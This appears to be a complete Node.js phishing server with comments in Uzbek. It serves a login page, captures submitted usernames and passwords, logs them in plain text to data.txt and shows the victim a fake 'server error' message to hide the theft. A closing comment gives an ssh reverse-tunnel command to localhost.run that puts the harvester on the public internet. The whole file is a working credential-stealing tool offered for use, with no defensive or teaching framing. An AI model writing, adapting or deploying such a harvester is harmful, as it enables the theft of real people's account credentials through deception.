const http = require('http');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');

// Serverni yaratish
const server = http.createServer((req, res) => {
    if (req.method === 'GET') {
        // HTML faylni o'qib, javob qaytarish
        const filePath = path.join(__dirname, 'index.html');
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Serverda xato yuz berdi');
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(data);
            }
        });
    } else if (req.method === 'POST') {
        // POST orqali yuborilgan ma'lumotlarni olish
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', () => {
            const parsedData = querystring.parse(body);
            const logPass = `Login: ${parsedData.login}, Password: ${parsedData.password}\n`;
            console.log(logPass);
            
            // Faylga yozish
            fs.appendFile('data.txt', logPass, err => {
                if (err) {
                    console.error('Faylga yozishda xato:', err);
                    res.writeHead(500, { 'Content-Type': 'text/plain' });
                    res.end('Ma\'lumotni tekshirishda xatolik!');
                } else {
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    res.end('!!!Server xatoligi!!!');
                }
            });
        });
    } else {
        res.writeHead(405, { 'Content-Type': 'text/plain' });
        res.end('Faqat GET va POST so\'rovlar qo\'llab-quvvatlanadi');
    }
});

// Serverni 7777 portda ishga tushirish
const PORT = 7777;
server.listen(PORT, () => {
    console.log(` http://localhost:${PORT} `);
});



// ssh -i ~/.ssh/id_rsa -R 80:localhost:7777 nokey@localhost.run